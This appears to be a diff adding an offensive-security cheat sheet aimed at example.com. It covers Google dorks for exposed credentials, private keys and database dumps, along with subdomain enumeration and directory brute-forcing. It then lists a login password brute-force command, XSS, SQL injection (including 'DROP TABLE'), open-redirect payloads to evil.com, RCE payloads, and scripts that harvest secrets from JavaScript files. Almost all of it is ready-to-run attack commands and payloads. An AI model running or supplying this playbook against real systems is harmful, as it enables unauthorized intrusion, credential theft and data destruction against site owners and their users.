@@ -1,0 +1,366 @@
+Dorking:
+
+site:example.com ext:log | ext:txt | ext:conf | ext:cnf | ext:ini | ext:env | ext:sh | ext:bak | ext:backup | ext:swp | ext:old | ext:~ | ext:git | ext:svn | ext:htpasswd | ext:htaccess
+site:example.com intitle:"index of" "parent directory"
+site:example.com inurl:/wp-content/uploads/
+site:example.com filetype:sql | filetype:db | filetype:mdb | filetype:inc | filetype:rdp | filetype:cfg
+site:example.com "api key" | "api_token" | "access key" | "secret key" | "password" | "admin" | "login"
+
+site:example.com ext:sql | ext:db | ext:dbf | ext:mdb | ext:accdb
+site:example.com ext:txt | ext:log | ext:cfg | ext:conf | ext:ini
+site:example.com ext:pdf | ext:doc | ext:docx | ext:xls | ext:xlsx
+site:example.com ext:pptx | ext:ppt | ext:odt | ext:rtf
+
+site:example.com ext:sql "password"
+site:example.com ext:db "username"
+site:example.com ext:mdb inurl:users
+site:example.com "dump.sql" | "backup.sql"
+site:example.com ext:sql "CREATE TABLE"
+
+site:example.com ext:env | ext:yml | ext:yaml | ext:properties
+site:example.com ext:conf "password"
+site:example.com ext:ini "pass="
+site:example.com ext:cfg "secret"
+site:example.com filetype:config intext:password
+
+site:example.com ext:bak | ext:backup | ext:old | ext:swp
+site:example.com ext:zip | ext:tar | ext:gz | ext:rar | ext:7z
+site:example.com "index of" "backup"
+site:example.com intitle:"index of" "database.sql"
+
+site:example.com ext:pem | ext:ppk | ext:key | ext:cer | ext:pfx
+site:example.com ext:rsa | ext:dsa | ext:ssh | ext:openssh
+site:example.com "BEGIN RSA PRIVATE KEY"
+site:example.com "BEGIN OPENSSH PRIVATE KEY"
+site:example.com "-----BEGIN PRIVATE KEY-----"
+intitle:"index of /" ssh 
+intitle:"index of" /.ssh/id_rsa OR id_rsa.pub 
+
+site:example.com ext:ftp | ext:sftp | ext:ftps
+site:example.com filetype:htpasswd
+site:example.com filetype:htaccess
+site:example.com inurl:passwd filetype:txt
+site:example.com "login:*:*" ext:txt
+
+site:example.com ext:git | ext:svn | ext:hg | ext:cvs
+site:example.com "git clone" ext:txt
+site:example.com inurl:.git/config
+site:example.com ext:php intitle:phpinfo "PHP Version"
+
+site:example.com ext:log "error"
+site:example.com ext:log "login failed"
+site:example.com ext:log "password"
+site:example.com ext:log "user"
+
+site:example.com filetype:doc | filetype:docx | filetype:xls | filetype:xlsx "password"
+site:example.com filetype:pdf "confidential"
+site:example.com filetype:pdf "internal use only"
+site:example.com filetype:csv "username,password"
+
+site:example.com ext:json "api_key"
+site:example.com ext:xml "password"
+site:example.com filetype:asmx | filetype:aspx
+site:example.com swagger.json | swagger.yaml
+site:example.com inurl:api/v1 ext:json
+
+site:example.com (ext:sql OR ext:db OR ext:dbf OR ext:mdb OR ext:accdb OR ext:sqlite OR ext:txt OR ext:log OR ext:cfg OR ext:conf OR ext:ini OR ext:env OR ext:yml OR ext:yaml OR ext:properties OR ext:bak OR ext:backup OR ext:old OR ext:swp OR ext:zip OR ext:tar OR ext:gz OR ext:rar OR ext:7z OR ext:pem OR ext:ppk OR ext:key OR ext:cer OR ext:pfx OR ext:rsa OR ext:dsa OR ext:ssh OR ext:git OR ext:svn OR ext:htpasswd OR ext:htaccess OR filetype:config OR filetype:asmx OR filetype:aspx OR ext:json OR ext:xml) AND ("password" OR "passwd" OR "pwd" OR "secret" OR "key" OR "api" OR "token" OR "credential" OR "auth" OR "login" OR "username" OR "user" OR "database" OR "backup" OR "dump")
+
+site:example.com inurl:"/uploads/" ext:php
+site:example.com intext:"connectionString" ext:config
+
+site:example.com intitle:"admin" | intitle:"login" | intitle:"dashboard" | intitle:"control panel"
+site:example.com inurl:"reset" | inurl:"forgot" | inurl:"recover" intext:"password"
+
+site:example.com intitle:"index of" "documentation"
+site:example.com filetype:md "README"
+
+site:example.com intitle:"admin" | intitle:"login" | intitle:"dashboard"
+site:example.com inurl:"admin" | inurl:"login" | inurl:"dashboard"
+site:example.com intitle:"admin login"
+site:example.com inurl:"admin/login.php"
+site:example.com inurl:"/admin/" ext:php | ext:html | ext:asp
+
+site:example.com inurl:"/wp-admin/" | inurl:"/wp-login.php"
+site:example.com inurl:"/administrator/" | inurl:"/admincp/"
+site:example.com inurl:"/admin/" | inurl:"/adminpanel/"
+site:example.com inurl:"/user/login" | inurl:"/member/login"
+site:example.com inurl:"/backend/" | inurl:"/console/"
+
+site:example.com inurl:"/wp-admin/" | inurl:"/wp-login.php"
+site:example.com inurl:"/wp-admin/admin-ajax.php"
+
+site:example.com inurl:"/administrator/" intitle:"Joomla"
+site:example.com inurl:"index.php?option=com_user"
+
+site:example.com inurl:"/user/login" intitle:"Drupal"
+site:example.com inurl:"/user/register" intitle:"Drupal"
+
+site:example.com inurl:"/admin/dashboard/"
+site:example.com inurl:"/index.php/admin/"
+
+site:example.com intitle:"login" | intitle:"sign in" | intitle:"log in"
+site:example.com inurl:"login.aspx" | inurl:"login.php" | inurl:"login.jsp"
+site:example.com inurl:"auth" | inurl:"authentication"
+site:example.com inurl:"signin" | inurl:"signup"
+site:example.com inurl:"password" | inurl:"forgot" | inurl:"reset"
+
+site:example.com intitle:"control panel"
+site:example.com inurl:"/cpanel/" | inurl:"/webadmin/"
+site:example.com inurl:"/plesk/" | inurl:"/whm/"
+site:example.com inurl:"/manager/html" intitle:"Tomcat"
+site:example.com inurl:"/phpmyadmin/" | inurl:"/phppgadmin/"
+
+site:example.com inurl:"admin" ext:asp | ext:aspx | ext:php | ext:jsp
+site:example.com intitle:"admin" intext:"username" intext:"password"
+site:example.com inurl:"config" intext:"admin" | intext:"password"
+site:example.com filetype:php inurl:"admin" intext:"login"
+site:example.com inurl:"admin" intext:"welcome to admin panel"
+
+site:example.com inurl:"/admin/login/" intitle:"Django"
+
+site:example.com (intitle:"admin" | intitle:"login" | intitle:"dashboard" | intitle:"control panel" | intitle:"webadmin") (inurl:"admin" | inurl:"login" | inurl:"dashboard" | inurl:"cpanel" | inurl:"webadmin")
+
+site:example.com (inurl:"/admin/" | inurl:"/administrator/" | inurl:"/wp-admin/" | inurl:"/admincp/") (intitle:"login" | intitle:"admin" | intitle:"dashboard")
+
+site:example.com inurl:"admin" ext:php | ext:asp | ext:aspx
+
+site:example.com inurl:"admin.php" | inurl:"admin.asp" | inurl:"admin.jsp"
+
+site:example.com intext:"admin panel" | intext:"administrator login"
+
+site:example.com inurl:"test" | inurl:"dev" | inurl:"stage" intitle:"admin"
+
+site:example.com ext:html | ext:htm
+site:example.com ext:js | ext:javascript
+site:example.com ext:php | ext:php3 | ext:php4 | ext:php5 | ext:php7 | ext:phtml
+site:example.com ext:sql
+site:example.com ext:zip | ext:rar | ext:tar | ext:gz | ext:7z | ext:tgz
+
+site:example.com ext:conf | ext:config | ext:ini | ext:env | ext:yml | ext:yaml
+site:example.com ext:bak | ext:backup | ext:old | ext:swp | ext:swo
+site:example.com ext:log | ext:txt
+
+site:example.com ext:db | ext:dbf | ext:mdb | ext:accdb | ext:sqlite | ext:sqlitedb
+site:example.com "dump.sql" | "backup.sql" | "database.sql"
+
+site:example.com ext:git | ext:svn | ext:gitignore
+site:example.com ext:java | ext:class | ext:jar
+site:example.com ext:py | ext:rb | ext:go
+site:example.com ext:c | ext:cpp | ext:h
+
+site:example.com ext:pdf | ext:doc | ext:docx | ext:xls | ext:xlsx | ext:ppt | ext:pptx
+site:example.com ext:csv | ext:tsv | ext:ods | ext:odt
+
+site:example.com ext:jpg | ext:jpeg | ext:png | ext:gif | ext:bmp
+site:example.com ext:mp3 | ext:mp4 | ext:avi | ext:mov | ext:wmv
+
+site:example.com (ext:html OR ext:htm OR ext:js OR ext:javascript OR ext:php OR ext:php3 OR ext:php4 OR ext:php5 OR ext:php7 OR ext:phtml OR ext:sql OR ext:zip OR ext:rar OR ext:tar OR ext:gz OR ext:7z OR ext:tgz OR ext:conf OR ext:config OR ext:ini OR ext:env OR ext:yml OR ext:yaml OR ext:bak OR ext:backup OR ext:old OR ext:swp OR ext:swo OR ext:log OR ext:txt OR ext:db OR ext:dbf OR ext:mdb OR ext:accdb OR ext:sqlite OR ext:sqlitedb OR ext:git OR ext:svn OR ext:gitignore OR ext:java OR ext:class OR ext:jar OR ext:py OR ext:rb OR ext:go OR ext:c OR ext:cpp OR ext:h OR ext:pdf OR ext:doc OR ext:docx OR ext:xls OR ext:xlsx OR ext:ppt OR ext:pptx OR ext:csv OR ext:tsv OR ext:ods OR ext:odt OR ext:jpg OR ext:jpeg OR ext:png OR ext:gif OR ext:bmp OR ext:mp3 OR ext:mp4 OR ext:avi OR ext:mov OR ext:wmv)
+
+site:example.com inurl:/uploads/ ext:php
+site:example.com inurl:/backup/ ext:zip
+
+site:example.com ext:git | ext:svn intitle:"index of"
+
+site:example.com ext:git | ext:svn intitle:"index of"
+
+site:*.example.com
+site:*.*.example.com
+site:*.example.com*
+site:*.*.*.example.com
+site:*.*.example.com/*
+
+
+Subdomain Finding:
+
+# Using Sublist3r
+sublist3r -d example.com -o subdomains.txt
+
+# Using AssetFinder
+assetfinder --subs-only example.com | tee -a subdomains.txt
+
+# Using Amass (passive mode)
+amass enum -passive -d example.com -o amass_passive.txt
+
+# Using Subfinder
+subfinder -d example.com -o subfinder.txt -silent
+
+# Using Amass (active mode)
+amass enum -active -d example.com -o amass_active.txt
+
+# Using AltDNS + MassDNS
+altdns -i subdomains.txt -o alt_domains.txt -w words.txt
+massdns -r resolvers.txt -t A -o S -w massdns_out.txt alt_domains.txt
+
+# Using DNSrecon
+dnsrecon -d example.com -t brt -D subdomains-top1mil.txt -c dnsrecon.csv
+
+# Using certspotter
+curl -s https://certspotter.com/api/v0/certs\?domain\=example.com | jq -r '.[].dns_names[]' | sort -u
+
+# Using crt.sh
+curl -s "https://crt.sh/?q=%.example.com&output=json" | jq -r '.[].name_value' | sort -u
+
+# Using tls.bufferover.run
+curl -s "https://tls.bufferover.run/dns?q=example.com" | jq -r .Results[] | cut -d ',' -f3 | sort -u
+
+# Using dnsgen + massdns
+dnsgen subdomains.txt | massdns -r resolvers.txt -t A -o S -w dnsgen_out.txt
+
+# Using puredns
+puredns bruteforce all.txt example.com -r resolvers.txt -w puredns_out.txt
+
+# Using gobuster
+gobuster dns -d example.com -w subdomains-top1mil.txt -t 50 -o gobuster_out.txt
+
+# Using Waybackurls
+waybackurls example.com | unfurl domains
+
+# Using gau
+gau --subs example.com | unfurl domains
+
+# Using CommonCrawl
+python3 cc.py example.com
+
+Directory Bruteforce:
+dirsearch -u https://example.com -e php,html,js,txt,json -t 50
+
+ffuf -u https://example.com/FUZZ -w /path/to/wordlist.txt
+ffuf -u https://example.com/FUZZ -w wordlist.txt -recursion -recursion-depth 2
+ffuf -u https://example.com/FUZZ.php -w wordlist.txt
+ffuf -u https://example.com/FUZZ -w wordlist.txt -e .php,.bak,.txt
+ffuf -u https://example.com/login -X POST -d "username=admin&password=FUZZ" -w passwords.txt -H "Content-Type: application/x-www-form-urlencoded"
+ffuf -u https://FUZZ.example.com -w subdomains.txt -H "Host: FUZZ.example.com"
+ffuf -u https://example.com/api?param=FUZZ -w params.txt
+ffuf -u https://example.com/search -X POST -d "query=FUZZ" -w sqli_payloads.txt
+
+gobuster dir -u https://example.com -w wordlist.txt -x php -r
+gobuster vhost -u https://example.com -w subdomains.txt -t 50
+gobuster dns -d example.com -w subdomains.txt -t 50
+gobuster dir -u https://example.com -w wordlist.txt -b 403,404
+
+Easy Recon:
+
+sublist3r -d example.com -o subdomains.txt
+assetfinder --subs-only example.com | tee -a subdomains.txt
+subfinder -d example.com -o subdomains_subfinder.txt
+cat subdomains*.txt | sort -u > final_subdomains.txt
+cat final_subdomains.txt | httpx -title -tech-detect -status-code -o active_subdomains.txt
+cat active_subdomains.txt | waybackurls > wayback_urls.txt
+gau example.com > gau_urls.txt
+cat wayback_urls.txt gau_urls.txt | sort -u > all_urls.txt
+
+ffuf -u https://example.com/FUZZ -w /path/to/wordlist.txt -mc 200,301,302,403 -o ffuf_results.json
+
+
+XSS:
+
+<script>alert(1)</script>
+"><script>alert(1)</script>
+javascript:alert(1)
+' onmouseover='alert(1)'
+
+%3Cscript%3Ealert%281%29%3C%2Fscript%3E
+%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E
+%27%20onmouseover%3D%27alert%281%29%27
+
+cat all_urls.txt | grep "=" | kxss
+cat all_urls.txt | dalfox pipe
+
+SQL:
+
+'
+"
+'
+"
+' OR '1'='1
+" OR "1"="1
+' OR 1=1--
+" OR 1=1--
+' OR 1=1; DROP TABLE users--
+
+' OR (SELECT COUNT(*) FROM GENERATE_SERIES(1,10000000))--
+' OR IF(1=1,SLEEP(5),0)--
+
+%27%20OR%201%3D1--
+%22%20OR%201%3D1--
+
+sqlmap -u "https://example.com/page.php?id=1" --batch --crawl=2
+
+Open Redirect:
+
+https://example.com/redirect?url=https://evil.com
+https://example.com/redirect?url=//evil.com
+https://example.com/redirect?url=\evil.com
+https://example.com/redirect?url=http://google.com@evil.com
+https://example.com/redirect?url=https%3A%2F%2Fevil.com
+
+cat all_urls.txt | grep -i "url=|redirect=|next=|target=|r=|u=|destination=" | qsreplace "https://evil.com" | httpx -status-code -location
+
+RCE:
+
+; system('id');
+| system('id');
+`system('id')`
+$(system('id'))
+<?php system('id'); ?>
+
+cat all_urls.txt | grep -E "api[^a-zA-Z0-9]|token[^a-zA-Z0-9]|key[^a-zA-Z0-9]|secret[^a-zA-Z0-9]|auth[^a-zA-Z0-9]|cred[^a-zA-Z0-9]"
+cat all_urls.txt | grep "\.js$" | httpx -silent -status-code | while read url; do curl -s $url | grep -E "api[^a-zA-Z0-9]|token[^a-zA-Z0-9]|key[^a-zA-Z0-9]|secret[^a-zA-Z0-9]"; done
+
+ffuf -u https://example.com/FUZZ/.git/HEAD -w /path/to/wordlist.txt -mc 200
+cat active_subdomains.txt | while read url; do curl -s "$url" | grep -q "Index of /" && echo "Directory listing enabled: $url"; done
+
+nuclei -l active_subdomains.txt -t /path/to/nuclei-templates/ -o nuclei_results.txt
+wpscan --url https://example.com --enumerate vp,vt,u --api-token YOUR_API_TOKEN
+nikto -h https://example.com -output nikto_results.txt
+
+
+JS:
+
+# Get all Wayback URLs for your domain
+waybackurls example.com > wayback_urls.txt
+
+# Alternative using gau (gets more sources)
+gau example.com > gau_urls.txt
+
+# Combine and filter for JS files
+cat wayback_urls.txt gau_urls.txt | sort -u | grep -E "\.js($|\?)" > js_files.txt
+
+# Download all JS files
+mkdir js_files
+cat js_files.txt | while read url; do
+    filename=$(echo "$url" | sed 's/[^a-zA-Z0-9]/_/g').js
+    curl -s "$url" -o "js_files/$filename"
+done
+
+# Search for API keys, tokens, etc.
+grep -E -i -r "api[^a-zA-Z0-9]|token[^a-zA-Z0-9]|key[^a-zA-Z0-9]|secret[^a-zA-Z0-9]|auth[^a-zA-Z0-9]|cred[^a-zA-Z0-9]|password[^a-zA-Z0-9]" js_files/
+
+# Search for hardcoded credentials
+grep -E -i -r "username|user|login|pass|pwd|credential|access[^a-zA-Z0-9]key|secret[^a-zA-Z0-9]key" js_files/
+
+# Search for interesting endpoints
+grep -E -i -r "/api/|/v1/|/v2/|/internal/|/admin/|/private/|/auth/|/oauth/" js_files/
+
+# Install if needed
+npm install -g js-scan
+
+# Run against JS files
+js-scan -d js_files/ -o js_scan_results.json
+
+# Clone the repository
+git clone https://github.com/m4ll0k/SecretFinder.git
+cd SecretFinder
+
+# Install dependencies
+pip install -r requirements.txt
+
+# Run against your JS files
+python SecretFinder.py -i ../js_files/ -o cli
+
+# Install
+pip install trufflehog
+
+# Run against JS directory
+trufflehog filesystem --directory=js_files/ --json | jq .
+
